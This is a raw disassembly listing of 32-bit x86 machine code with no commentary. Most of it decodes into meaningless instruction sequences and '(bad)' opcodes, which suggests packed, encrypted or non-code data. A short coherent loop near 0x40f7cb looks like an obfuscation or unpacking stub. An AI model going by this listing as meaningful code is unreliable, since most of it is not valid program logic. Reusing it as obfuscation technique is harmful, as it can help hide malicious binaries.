  40f2ea:	mov    edi,0x14f13b79
  40f2ef:	jo     0x40f352
  40f2f1:	js     0x40f35e
  40f2f3:	(bad)  
  40f2f5:	sbb    BYTE PTR [eax+0x6f859e3c],bh
  40f2fb:	nop
  40f2fc:	push   edi
  40f2fd:	or     DWORD PTR [ecx+ebp*2-0x29c6e31e],0x628b3d08
  40f308:	iret   
  40f309:	mov    ds:0xbd31e7c6,al
  40f30e:	jecxz  0x40f2c4
  40f310:	mov    eax,ds:0x2e968630
  40f315:	cmp    edx,ebx
  40f317:	in     al,0xee
  40f319:	pushf  
  40f31a:	out    dx,eax
  40f31b:	lods   eax,DWORD PTR ds:[esi]
  40f31c:	mov    ebx,DWORD PTR [eax+0x7a7d2a88]
  40f322:	or     eax,0x9d5a6ef6
  40f327:	std    
  40f328:	jb     0x40f2fd
  40f32a:	mov    edx,0xda4093fb
  40f32f:	in     eax,0xd6
  40f331:	test   eax,0xe75c3ae7
  40f336:	inc    BYTE PTR [ebp+0x1e]
  40f339:	push   ecx
  40f33a:	ja     0x40f3b8
  40f33c:	mov    ah,0xc
  40f33e:	jmp    0xe4148a30
  40f343:	xor    DWORD PTR [ecx],0xe870d368
  40f349:	and    dl,BYTE PTR [esi-0x6b]
  40f34c:	fmul   QWORD PTR [ebx+ebx*8]
  40f34f:	xor    al,0x9c
  40f351:	in     eax,0x2c
  40f353:	les    esp,FWORD PTR [ebp+eax*8+0x51]
  40f357:	leave  
  40f358:	mov    ebx,0x78df59a9
  40f35d:	xor    eax,0x8a759aa7
  40f362:	xchg   DWORD PTR [eax+eiz*4+0x67],edi
  40f366:	fstp   DWORD PTR [edi-0x2e]
  40f369:	cmp    DWORD PTR [edx+0x29],edx
  40f36c:	cmp    ebx,DWORD PTR [esi+0x25214ad8]
  40f372:	cli    
  40f373:	js     0x40f3e5
  40f375:	cmp    al,0x24
  40f377:	cmp    eax,0xd67355a0
  40f37c:	xor    DWORD PTR [edx+0x74],eax
  40f37f:	shl    ch,cl
  40f381:	jmp    0x9908:0x2779f02f
  40f388:	xchg   edx,eax
  40f389:	xor    eax,0xba47f806
  40f38e:	or     BYTE PTR [ecx-0x55],al
  40f391:	(bad)  
  40f392:	push   cs
  40f393:	and    eax,0x7c1e94e3
  40f398:	outs   dx,DWORD PTR ds:[esi]
  40f399:	ror    bh,cl
  40f39b:	sub    eax,DWORD PTR [ecx+0x13]
  40f39e:	mov    esi,0x5d261314
  40f3a3:	dec    esi
  40f3a4:	inc    ebp
  40f3a5:	jo     0x40f372
  40f3a7:	mov    edi,0x615dc268
  40f3ac:	ja     0x40f3ab
  40f3ae:	ret    0xe3ac
  40f3b1:	les    esi,FWORD PTR [edi]
  40f3b3:	and    al,0xd4
  40f3b5:	fiadd  DWORD PTR ds:0x78cd8fca
  40f3bb:	xor    eax,DWORD PTR [ebp+0x78]
  40f3be:	adc    ah,BYTE PTR [edi+0x57]
  40f3c1:	or     esp,DWORD PTR [eax-0x28]
  40f3c4:	cli    
  40f3c5:	jae    0x40f366
  40f3c7:	inc    ebx
  40f3c8:	daa    
  40f3c9:	jnp    0x40f3ca
  40f3cb:	push   edx
  40f3cc:	lods   eax,DWORD PTR ds:[esi]
  40f3cd:	retf   0xb964
  40f3d0:	pop    edi
  40f3d1:	leave  
  40f3d2:	jne    0x40f379
  40f3d4:	mov    cl,0xcf
  40f3d6:	(bad)  
  40f3d7:	jmp    0x40f3fa
  40f3d9:	add    al,0x32
  40f3db:	int3   
  40f3dc:	outs   dx,DWORD PTR ds:[esi]
  40f3dd:	and    edx,eax
  40f3df:	fs mov ecx,0xc17f4f10
  40f3e5:	mov    edi,?
  40f3e7:	mov    BYTE PTR [edx+ebx*4+0x7d],al
  40f3eb:	push   0x42ef1e49
  40f3f0:	adc    BYTE PTR [esp+ecx*4+0x21ac6796],cl
  40f3f7:	adc    DWORD PTR [esi-0x3ddaa3ee],edx
  40f3fd:	cmp    eax,DWORD PTR [eax+edi*2]
  40f400:	and    eax,0x3e35d303
  40f405:	push   edi
  40f406:	inc    ebx
  40f407:	jae    0x40f3e3
  40f409:	or     BYTE PTR [edi+0x32],ah
  40f40c:	adc    DWORD PTR [ebp-0x53],ebx
  40f40f:	ret    0x129f
  40f412:	pop    ds
  40f413:	sub    cl,BYTE PTR [edx+0x42]
  40f416:	inc    ebp
  40f417:	jmp    0x40f488
  40f419:	aam    0x2d
  40f41b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f41c:	hlt    
  40f41d:	inc    eax
  40f41e:	std    
  40f41f:	add    DWORD PTR [esi-0x6b],ebx
  40f422:	and    ebx,0xffffffbc
  40f425:	nop
  40f426:	into   
  40f427:	xor    eax,0xebd3bf41
  40f42c:	outs   dx,BYTE PTR ds:[esi]
  40f42d:	xor    ebx,DWORD PTR [edx+eax*8-0x2f977eaa]
  40f434:	pop    ds
  40f435:	js     0x40f47d
  40f437:	adc    DWORD PTR [esi+ecx*4],ecx
  40f43a:	sbb    al,0xd8
  40f43c:	ror    bh,1
  40f43e:	mov    WORD PTR [ebx-0x325ac870],gs
  40f444:	(bad)  
  40f445:	std    
  40f446:	xor    DWORD PTR [esi+0x6b2eb2ab],ecx
  40f44c:	cmp    bl,BYTE PTR [ebp+0x61979cf1]
  40f452:	and    BYTE PTR [eax+edi*1-0x487197de],bl
  40f459:	sub    ch,BYTE PTR [edi-0x5c]
  40f45c:	push   esi
  40f45d:	jl     0x40f49d
  40f45f:	std    
  40f460:	fucom  st(2)
  40f462:	jbe    0x40f413
  40f464:	mov    ch,0xf5
  40f466:	shl    dl,cl
  40f468:	loop   0x40f3f0
  40f46a:	adc    DWORD PTR [esi-0x2],0x24
  40f46e:	xchg   ebx,edx
  40f470:	dec    ebx
  40f471:	retf   
  40f472:	xchg   ebp,eax
  40f473:	cmp    edx,DWORD PTR [ebx+0x34]
  40f476:	mov    ebp,0xb7c91b06
  40f47b:	shl    DWORD PTR [edx+esi*1-0x7a4e06ea],cl
  40f482:	mov    ah,0xf4
  40f484:	out    0x80,al
  40f486:	popf   
  40f487:	mov    edi,0x4fe3cf2
  40f48c:	pop    ebp
  40f48d:	daa    
  40f48e:	adc    al,0x3e
  40f490:	stc    
  40f491:	lahf   
  40f492:	pop    edi
  40f493:	mov    al,ds:0xb381e15a
  40f498:	or     DWORD PTR [edi+eiz*8+0x3d],esp
  40f49c:	es fneni(8087 only) 
  40f49f:	cmp    ecx,0x26
  40f4a2:	leave  
  40f4a3:	cmp    al,ah
  40f4a5:	mov    ch,BYTE PTR [ebp-0x7f1ca51b]
  40f4ab:	cmc    
  40f4ac:	enter  0x1a99,0xbb
  40f4b0:	and    eax,DWORD PTR [ecx]
  40f4b2:	int3   
  40f4b3:	adc    bl,al
  40f4b5:	mov    ds:0x6e128d4e,al
  40f4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4bb:	stc    
  40f4bc:	lock inc eax
  40f4be:	in     eax,0xdf
  40f4c0:	xor    al,0xfa
  40f4c2:	dec    esp
  40f4c3:	out    dx,eax
  40f4c4:	adc    eax,0x3e3b968
  40f4c9:	or     eax,0x85e53013
  40f4ce:	push   es
  40f4cf:	and    BYTE PTR [edi+0x2c],dl
  40f4d2:	call   0x922e:0xd6a05731
  40f4d9:	or     esi,DWORD PTR [edi]
  40f4db:	mov    ebx,0x36295b75
  40f4e0:	pminub mm2,mm0
  40f4e3:	mov    DWORD PTR [eax],ebp
  40f4e5:	(bad)  
  40f4e7:	jns    0x40f504
  40f4e9:	xor    ebp,DWORD PTR [ecx-0x40]
  40f4ec:	ja     0x40f53a
  40f4ee:	out    dx,al
  40f4ef:	(bad)  
  40f4f2:	sub    ch,dl
  40f4f4:	das    
  40f4f5:	jno    0x40f559
  40f4f7:	add    BYTE PTR [ebx-0x6a],al
  40f4fa:	nop
  40f4fb:	test   BYTE PTR [ecx],bl
  40f4fd:	cli    
  40f4fe:	mov    ah,0x68
  40f500:	jl     0x40f57a
  40f502:	sub    DWORD PTR [edx],0xaaa4eb91
  40f508:	or     ecx,DWORD PTR [ecx+0x7d39d571]
  40f50e:	imul   esp,esi,0x33
  40f511:	adc    edi,DWORD PTR [ebx]
  40f513:	and    BYTE PTR [eax-0x701cc40],ch
  40f519:	aad    0x46
  40f51b:	shl    ebx,cl
  40f51d:	dec    ecx
  40f51e:	mov    ch,0xca
  40f520:	in     eax,0xbc
  40f522:	arpl   di,ax
  40f524:	cli    
  40f525:	xor    BYTE PTR [ebx+0x6bf33198],0xc3
  40f52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f52d:	mov    cl,dh
  40f52f:	jno    0x40f511
  40f531:	pop    es
  40f532:	dec    ecx
  40f533:	cli    
  40f534:	mov    al,ds:0x9add2b55
  40f539:	xchg   edx,eax
  40f53a:	imul   ebx,DWORD PTR [ecx-0x5706b25b],0xa30f7c83
  40f544:	inc    ebp
  40f545:	sbb    eax,0x4ed9e5cc
  40f54a:	cmp    bh,BYTE PTR [ecx-0x6a8261d6]
  40f550:	push   cs
  40f551:	cmovp  ebx,DWORD PTR ds:0x3d3e7b14
  40f558:	mov    esi,DWORD PTR [ebp-0x5975e922]
  40f55e:	int    0x88
  40f560:	mov    bl,0xa7
  40f562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f563:	retf   0xe6d9
  40f566:	mov    ds:0xbed6339b,al
  40f56b:	or     edx,0xffffffe4
  40f56e:	popa   
  40f56f:	cld    
  40f570:	aam    0x6c
  40f572:	lods   al,BYTE PTR ds:[esi]
  40f573:	aaa    
  40f574:	xor    al,0xe9
  40f576:	xchg   edi,eax
  40f577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f578:	inc    ecx
  40f579:	hlt    
  40f57a:	cs popf 
  40f57c:	mov    edi,0xca940ead
  40f581:	and    eax,0xe4b88a02
  40f586:	sbb    eax,0x7a833a2c
  40f58b:	fs xor al,cl
  40f58e:	jb     0x40f580
  40f590:	pop    ss
  40f591:	neg    BYTE PTR [ebx]
  40f593:	jl     0x40f549
  40f595:	sbb    eax,0xcb37e070
  40f59a:	xchg   edi,eax
  40f59b:	repz or DWORD PTR [eax-0x17],edx
  40f59f:	mov    ds:0x4881c808,al
  40f5a4:	rcl    DWORD PTR [edx],1
  40f5a6:	mov    bh,0xd6
  40f5a8:	in     eax,dx
  40f5a9:	popf   
  40f5aa:	lods   al,BYTE PTR ds:[esi]
  40f5ab:	xor    BYTE PTR [esi-0x6da33a58],bl
  40f5b1:	mov    ds:0xcd4899a8,eax
  40f5b6:	fdivp  st(1),st
  40f5b8:	icebp  
  40f5b9:	loopne 0x40f602
  40f5bb:	mov    eax,DWORD PTR [edi-0x46]
  40f5be:	push   eax
  40f5bf:	cld    
  40f5c0:	or     bh,BYTE PTR [ecx]
  40f5c2:	push   eax
  40f5c3:	pshufw mm3,mm0,0xab
  40f5c7:	call   FWORD PTR ds:0xc06eda27
  40f5cd:	inc    esp
  40f5ce:	mov    dh,0x83
  40f5d0:	outs   dx,DWORD PTR ds:[esi]
  40f5d1:	imul   cx,WORD PTR [edi+0x627ec0a7],0xff90
  40f5d9:	dec    ebx
  40f5da:	jl     0x40f637
  40f5dc:	push   0x5
  40f5de:	inc    ecx
  40f5df:	sahf   
  40f5e0:	clc    
  40f5e1:	loop   0x40f634
  40f5e3:	aaa    
  40f5e4:	pop    ecx
  40f5e5:	xchg   ebx,eax
  40f5e6:	jnp    0x40f5ae
  40f5e8:	cwde   
  40f5e9:	push   ecx
  40f5ea:	push   esp
  40f5eb:	out    dx,eax
  40f5ec:	inc    edi
  40f5ed:	pop    eax
  40f5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5ef:	push   eax
  40f5f0:	push   0xffffffcd
  40f5f2:	jbe    0x40f5a1
  40f5f4:	shl    ebp,cl
  40f5f6:	xchg   edx,eax
  40f5f7:	push   es
  40f5f8:	ss inc ebp
  40f5fa:	test   al,0x8
  40f5fc:	xchg   ecx,eax
  40f5fd:	sub    eax,0x180d24e6
  40f602:	add    ecx,DWORD PTR [esi-0x263fa3ed]
  40f608:	fisttp DWORD PTR [edi+0x1e]
  40f60b:	in     al,0x33
  40f60d:	ins    BYTE PTR es:[edi],dx
  40f60e:	jns    0x40f627
  40f610:	lahf   
  40f611:	int    0xa1
  40f613:	(bad)  
  40f614:	pusha  
  40f615:	xor    al,0x3
  40f617:	mov    ?,WORD PTR [ebp+eiz*4+0x10efe5a5]
  40f61e:	sahf   
  40f61f:	mov    al,0xeb
  40f621:	int3   
  40f622:	(bad)  
  40f623:	push   edi
  40f624:	jg     0x40f666
  40f626:	outs   dx,BYTE PTR cs:[esi]
  40f628:	or     BYTE PTR [esi],al
  40f62a:	pusha  
  40f62b:	mov    BYTE PTR [edx],0x77
  40f62e:	sub    bh,BYTE PTR [edx+0x1a]
  40f631:	xchg   ebp,eax
  40f632:	inc    esp
  40f633:	loope  0x40f68f
  40f635:	inc    BYTE PTR [esi+0x4a]
  40f638:	test   BYTE PTR [edx],0x6d
  40f63b:	hlt    
  40f63c:	and    DWORD PTR ds:0x844eb50f,ecx
  40f642:	mov    ebx,0xa9574f74
  40f647:	jne    0x40f66c
  40f649:	cmp    al,0x0
  40f64b:	test   eax,0xf5c63c16
  40f650:	sub    BYTE PTR [eax-0x3b98f2be],0x29
  40f657:	push   0xffffffcc
  40f659:	push   cs
  40f65a:	scas   al,BYTE PTR es:[edi]
  40f65b:	mov    ch,0xac
  40f65d:	std    
  40f65e:	aam    0xeb
  40f660:	pop    ebx
  40f661:	add    DWORD PTR [esp+eiz*4],esi
  40f664:	bound  ebx,QWORD PTR [edi-0x3]
  40f667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f668:	mov    eax,0xfe6185d
  40f66d:	jae    0x40f6e7
  40f66f:	adc    DWORD PTR [edx],ecx
  40f671:	mov    BYTE PTR [eax+0x673eda89],ah
  40f677:	mov    ebx,0x332a01e0
  40f67c:	inc    ebp
  40f67d:	(bad)  
  40f67e:	xor    DWORD PTR [esi-0x1a],edx
  40f681:	dec    edx
  40f682:	jns    0x40f702
  40f684:	xor    eax,0x19445191
  40f689:	scas   al,BYTE PTR es:[edi]
  40f68a:	xchg   BYTE PTR [edi],bl
  40f68c:	rcr    bh,0xfd
  40f68f:	repz enter 0x9fcd,0x1e
  40f694:	repz ss mov ch,0xc7
  40f698:	jbe    0x40f717
  40f69a:	cmp    DWORD PTR [edi-0x63],ecx
  40f69d:	pop    esi
  40f69e:	ror    BYTE PTR [ecx-0x3bbad14a],0x1a
  40f6a5:	push   ss
  40f6a6:	jbe    0x40f711
  40f6a8:	or     dl,cl
  40f6aa:	mov    BYTE PTR [ebx+0x4d3b4014],ch
  40f6b0:	inc    edi
  40f6b1:	fidivr DWORD PTR [esp+eiz*8-0x62698985]
  40f6b8:	out    0x6,al
  40f6ba:	stos   BYTE PTR es:[edi],al
  40f6bb:	push   cs
  40f6bc:	and    eax,0x44a40b16
  40f6c1:	ss mov esi,0x129197be
  40f6c7:	(bad)  
  40f6c8:	test   al,0x62
  40f6ca:	in     al,dx
  40f6cb:	addr16 push ebp
  40f6cd:	inc    ebx
  40f6ce:	cli    
  40f6cf:	hlt    
  40f6d0:	sub    eax,0xfe58a887
  40f6d5:	push   ecx
  40f6d6:	push   esp
  40f6d7:	hlt    
  40f6d8:	iret   
  40f6d9:	cwde   
  40f6da:	xor    ah,BYTE PTR [ecx+0x538b7785]
  40f6e0:	ja     0x40f6b0
  40f6e2:	dec    ebp
  40f6e3:	(bad)  
  40f6e4:	jl     0x40f69c
  40f6e6:	xchg   esp,eax
  40f6e7:	or     BYTE PTR [esi-0x67],0x1d
  40f6eb:	pop    edi
  40f6ec:	in     eax,dx
  40f6ed:	out    0x64,eax
  40f6ef:	cwde   
  40f6f0:	sub    al,0x11
  40f6f2:	cmp    BYTE PTR [edx+0xbc01cbb],ch
  40f6f8:	mov    dh,0x52
  40f6fa:	ja     0x40f69b
  40f6fc:	scas   eax,DWORD PTR es:[edi]
  40f6fd:	int    0xc3
  40f6ff:	jecxz  0x40f703
  40f701:	sub    al,0x16
  40f703:	dec    edi
  40f704:	pop    ecx
  40f705:	fistp  WORD PTR [esi]
  40f707:	rol    BYTE PTR [ebx-0x1a],0x60
  40f70b:	shl    BYTE PTR [edi-0x47],0xee
  40f70f:	popf   
  40f710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f711:	test   eax,0x79884f65
  40f716:	fld    QWORD PTR [edi-0x35ef3639]
  40f71c:	mov    ecx,0x2453409a
  40f721:	mov    ?,WORD PTR [esi+0x79b39616]
  40f727:	iret   
  40f728:	mov    ebx,0xc7e3088a
  40f72d:	jo     0x40f749
  40f72f:	jae    0x40f741
  40f731:	xchg   edi,eax
  40f732:	mov    esi,0x61be65b0
  40f737:	test   al,al
  40f739:	jmp    0xc3e6:0xf734b39c
  40f740:	pop    es
  40f741:	mov    ebp,0x7a4add64
  40f746:	and    ecx,ebp
  40f748:	sahf   
  40f749:	ror    ebx,1
  40f74b:	lds    esp,FWORD PTR [esi-0x5b26042f]
  40f751:	stos   BYTE PTR es:[edi],al
  40f752:	cmc    
  40f753:	gs icebp 
  40f755:	retf   
  40f756:	xor    BYTE PTR [eax-0x3880efdf],dh
  40f75c:	add    eax,0x780a1fc2
  40f761:	jmp    0x5da84061
  40f766:	not    BYTE PTR [ecx]
  40f768:	add    dl,BYTE PTR [ebp+0xf]
  40f76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f76c:	inc    esi
  40f76d:	enter  0x3689,0x98
  40f771:	xor    bh,BYTE PTR [ecx-0x6867fc50]
  40f777:	ficom  WORD PTR gs:[ebp+0x1f5ea07d]
  40f77e:	jnp    0x40f787
  40f780:	out    dx,al
  40f781:	xchg   dh,dh
  40f783:	sub    eax,edi
  40f785:	aam    0xf1
  40f787:	push   0x69
  40f789:	(bad)  
  40f78a:	mov    ebx,0x27dec4e2
  40f78f:	jbe    0x40f79d
  40f791:	and    eax,0x724d60c4
  40f796:	(bad)  
  40f797:	mov    bh,0x8c
  40f799:	shl    DWORD PTR [ecx-0x5ae20ab0],cl
  40f79f:	test   BYTE PTR [edi+0x5a],ch
  40f7a2:	icebp  
  40f7a3:	rol    DWORD PTR [esi],1
  40f7a5:	aad    0x4a
  40f7a7:	dec    edi
  40f7a8:	enter  0x8203,0x6b
  40f7ac:	and    al,0x41
  40f7ae:	inc    ebp
  40f7af:	push   edx
  40f7b0:	sbb    bl,dl
  40f7b2:	adc    edx,edi
  40f7b4:	mov    ds:0xdff0896b,eax
  40f7b9:	sub    cl,BYTE PTR [ebp-0x60]
  40f7bc:	push   esp
  40f7bd:	cld    
  40f7be:	lea    esp,[ebx+0x6dc7b172]
  40f7c4:	and    dh,BYTE PTR [ebp-0x47]
  40f7c7:	mov    bl,0x8
  40f7c9:	push   ecx
  40f7ca:	pop    es
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x925e9c9c
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	les    esp,FWORD PTR [ebp+ecx*8+0x4f]
  40f874:	cmp    DWORD PTR [edx-0x60],ebp
  40f877:	out    0xd8,al
  40f879:	push   ds
  40f87a:	inc    eax
  40f87b:	mov    ebx,0x36f8a601
  40f880:	xchg   esi,eax
  40f881:	ss jne 0x40f8db
  40f884:	addr16 mov ds:0xa889,al
  40f888:	mov    al,ds:0xe61ee0e7
  40f88d:	sbb    dl,0xba
  40f890:	mov    al,0xac
  40f892:	les    edx,FWORD PTR gs:[eax+0x59c94cdf]
  40f899:	enter  0x5bc5,0x17
  40f89d:	ret    0x1aa0
  40f8a0:	xchg   DWORD PTR [edi-0x6d37c120],edx
  40f8a6:	out    dx,al
  40f8a7:	sub    al,0xb4
  40f8a9:	bound  edi,QWORD PTR [edx-0x377c23e7]
  40f8af:	push   es
  40f8b0:	sub    eax,DWORD PTR [edi+0x19f529c3]
  40f8b6:	(bad)  
  40f8b8:	sub    DWORD PTR [ebp-0x44],eax
  40f8bb:	push   es
  40f8bc:	retf   
  40f8bd:	cmp    BYTE PTR [eax-0x31],bh
  40f8c0:	push   ecx
  40f8c1:	mov    ecx,eax
  40f8c3:	cs inc edi
  40f8c5:	push   eax
  40f8c6:	fisubr DWORD PTR [ebp-0x769d23d8]
  40f8cc:	mov    esi,0xc74b5c2b
  40f8d1:	and    al,0x1a
  40f8d3:	shr    DWORD PTR [eax],0xc4
  40f8d6:	int    0x9c
  40f8d8:	or     al,0x2a
  40f8da:	xlat   BYTE PTR ds:[ebx]
  40f8db:	pop    eax
  40f8dc:	call   0x2b:0x55648709
  40f8e3:	call   DWORD PTR [ecx+0x5b]
  40f8e6:	push   es
  40f8e7:	mov    ebp,DWORD PTR [eax+edx*8-0x31]
  40f8eb:	test   BYTE PTR [esi*2-0x668ab943],al
  40f8f2:	fwait
  40f8f3:	add    eax,0x7bf80c1e
  40f8f8:	push   edx
  40f8f9:	fcomp  QWORD PTR [ebx+esi*2-0x11]
  40f8fd:	mov    bl,0x73
  40f8ff:	cs jge 0x40f92a
  40f902:	out    0x8c,al
  40f904:	jae    0x40f8fe
  40f906:	lods   al,BYTE PTR ds:[esi]
  40f907:	add    eax,0x53c4081c
  40f90c:	(bad)  
  40f90d:	popf   
  40f90e:	pop    eax
  40f90f:	add    ch,ah
  40f911:	jmp    0x40f899
  40f913:	jg     0x40f94a
  40f915:	mov    edx,ds
  40f917:	mov    edi,0x8aeeb27
  40f91c:	pop    ebx
  40f91d:	bound  ebp,QWORD PTR [edx]
  40f91f:	push   cs
  40f920:	in     al,0x24
  40f922:	popf   
  40f923:	jmp    0x40f991
  40f925:	and    al,BYTE PTR [edi+edi*1+0x2a]
  40f929:	hlt    
  40f92a:	or     esi,edx
  40f92c:	lahf   
  40f92d:	push   ecx
  40f92e:	outs   dx,BYTE PTR ds:[esi]
  40f92f:	daa    
  40f930:	inc    edi
  40f931:	mov    bl,0xfe
  40f933:	inc    ebx
  40f934:	xchg   DWORD PTR [edx+0x72],edx
  40f937:	int3   
  40f938:	ins    DWORD PTR es:[edi],dx
  40f939:	mov    al,0x9c
  40f93b:	push   ds
  40f93c:	ja     0x40f9a9
  40f93e:	xor    cl,BYTE PTR [ebx+0x72]
  40f941:	add    BYTE PTR [eax+eiz*8-0x6e9c187e],ch
  40f948:	push   cs
  40f949:	lds    edi,FWORD PTR [ecx]
  40f94b:	xchg   esp,eax
  40f94c:	push   0x2e91e4ea
  40f951:	jns    0x40f9a1
  40f953:	xchg   edi,eax
  40f954:	sahf   
  40f955:	std    
  40f956:	xor    al,0x58
  40f958:	(bad)  
  40f959:	fisttp QWORD PTR [ebp-0x26f6886a]
  40f95f:	xor    eax,0xfc940013
  40f964:	outs   dx,BYTE PTR ds:[esi]
  40f965:	jge    0x40f9a2
  40f967:	jle    0x40f97d
  40f969:	bound  edx,QWORD PTR [edi+0x28aba83a]
  40f96f:	popa   
  40f970:	sahf   
  40f971:	inc    ebx
  40f972:	pop    edi
  40f973:	or     bl,bh
  40f975:	out    0x9f,al
  40f977:	and    DWORD PTR [ebp-0x4da0aadf],esp
  40f97d:	mov    eax,ds:0x6298c8e7
  40f982:	ja     0x40f9b0
  40f984:	out    dx,al
  40f985:	mov    edx,0x29ba6343
  40f98a:	rol    esi,0x79
  40f98d:	cld    
  40f98e:	(bad)  
  40f98f:	mov    cl,0x92
  40f991:	repz jmp edx
  40f994:	in     eax,dx
  40f995:	repz xchg esp,eax
  40f997:	mov    esp,DWORD PTR [edi]
  40f999:	cmc    
  40f99a:	dec    edi
  40f99b:	sbb    eax,0x3b52faa
  40f9a0:	nop
  40f9a1:	mov    cl,0xba
  40f9a3:	sub    eax,ebx
  40f9a5:	jne    0x40f9f9
  40f9a7:	out    dx,eax
  40f9a8:	into   
  40f9a9:	mov    ah,0xaa
  40f9ab:	mov    al,ds:0x625e7225
  40f9b0:	outs   dx,DWORD PTR ds:[esi]
  40f9b1:	sbb    al,0x52
  40f9b3:	icebp  
  40f9b4:	dec    ecx
  40f9b5:	push   ds
  40f9b6:	lods   al,BYTE PTR ds:[esi]
  40f9b7:	adc    DWORD PTR [esp+ebp*4+0x792761cb],0xfffffff2
  40f9bf:	cdq    
  40f9c0:	add    eax,0xe231a561
  40f9c5:	mov    ch,ah
  40f9c7:	xor    ebp,DWORD PTR [eax+0x79311dca]
  40f9cd:	gs push ss
  40f9cf:	mov    esp,DWORD PTR [ebx-0x80]
  40f9d2:	mov    al,ds:0x55c5c664
  40f9d7:	fst    DWORD PTR [ebp+0x1f]
  40f9da:	push   ebx
  40f9db:	add    BYTE PTR [eax-0x73],0xf9
  40f9df:	jp     0x40f964
  40f9e1:	mul    dl
  40f9e3:	fdiv   DWORD PTR [ecx-0x4e]
  40f9e6:	jne    0x40f9b0
  40f9e8:	adc    DWORD PTR [ebp+0x333ea5e1],ecx
  40f9ee:	and    BYTE PTR [edi+ebp*2],dl
  40f9f1:	mov    edx,0x62d30229
  40f9f6:	nop
  40f9f7:	sub    bl,BYTE PTR [edx+0x30]
  40f9fa:	xchg   ecx,eax
  40f9fb:	fsubr  st(1),st
  40f9fd:	(bad)  
  40f9fe:	es pop esi
  40fa00:	mov    bl,0x96
  40fa02:	inc    edx
  40fa03:	fdiv   QWORD PTR ds:0x3c8c0d7c
  40fa09:	ret    0x5c06
  40fa0c:	and    ebp,DWORD PTR [ecx+0x48c80ae9]
  40fa12:	in     eax,dx
  40fa13:	or     dh,cl
  40fa15:	jg     0x40fa3d
  40fa17:	arpl   WORD PTR ds:0xdb2ea9e3,sp
  40fa1d:	arpl   WORD PTR [edx+eiz*2+0x3a4a2de],cx
  40fa24:	lds    ebx,FWORD PTR [edx*4+0x729d8709]
  40fa2b:	test   BYTE PTR [ebx+0x69c67676],cl
  40fa31:	gs dec edi
  40fa33:	scas   eax,DWORD PTR es:[edi]
  40fa34:	sub    dh,dl
  40fa36:	dec    edi
  40fa37:	inc    eax
  40fa38:	push   cs
  40fa39:	enter  0xae00,0x24
  40fa3d:	push   ebx
  40fa3e:	mov    esi,0xf06e181d
  40fa44:	cmp    esi,ecx
  40fa46:	mov    ecx,DWORD PTR [edi+0x52]
  40fa49:	mov    esp,0xce088071
  40fa4e:	les    esp,FWORD PTR [ecx+0x17]
  40fa51:	mov    cl,0x4d
  40fa53:	sub    bl,BYTE PTR [ebp-0x8]
  40fa56:	push   edx
  40fa57:	mov    esp,0x74f58eef
  40fa5c:	pop    edi
  40fa5d:	sbb    al,0xcb
  40fa5f:	data16 add al,0x61
  40fa62:	test   al,0x60
  40fa64:	push   eax
  40fa65:	mov    al,ds:0x3db910a5
  40fa6a:	lods   al,BYTE PTR ds:[esi]
  40fa6b:	(bad)
  40fa6e:	pop    esi
  40fa6f:	and    bp,sp
  40fa72:	inc    ebx
  40fa73:	jbe    0x40fa72
  40fa75:	(bad)  
  40fa76:	(bad)  
  40fa77:	mov    esi,0x5a7256a0
  40fa7c:	push   0xaee870c5
  40fa81:	(bad)  
  40fa82:	sub    ebx,ebx
  40fa84:	mov    DWORD PTR [edi+0x67c28bee],0xd6432915
  40fa8e:	cmp    DWORD PTR [ecx],eax
  40fa90:	sbb    DWORD PTR [esi-0x15],edx
  40fa93:	bound  eax,QWORD PTR [ecx-0x59]
  40fa96:	push   ebx
  40fa97:	imul   eax
  40fa99:	fcom   QWORD PTR [esi+0x1a]
  40fa9c:	arpl   WORD PTR [eax+0x53],si
  40fa9f:	pop    esp
  40faa0:	pusha  
  40faa1:	ret    
  40faa2:	and    eax,0x140fd6dc
  40faa7:	imul   ebp,DWORD PTR [esi],0xffffff98
  40faaa:	mov    ebp,0xc2529868
  40faaf:	in     al,dx
  40fab0:	ins    BYTE PTR es:[edi],dx
  40fab1:	mov    WORD PTR [eax*2+0x32597ea4],ss
  40fab8:	inc    eax
  40fab9:	xchg   esp,eax
  40faba:	in     al,0x7b
  40fabc:	scas   al,BYTE PTR es:[edi]
  40fabd:	mov    bl,0x6
  40fabf:	sub    DWORD PTR [edi+0x24e8f71d],edx
  40fac5:	xor    al,0xd4
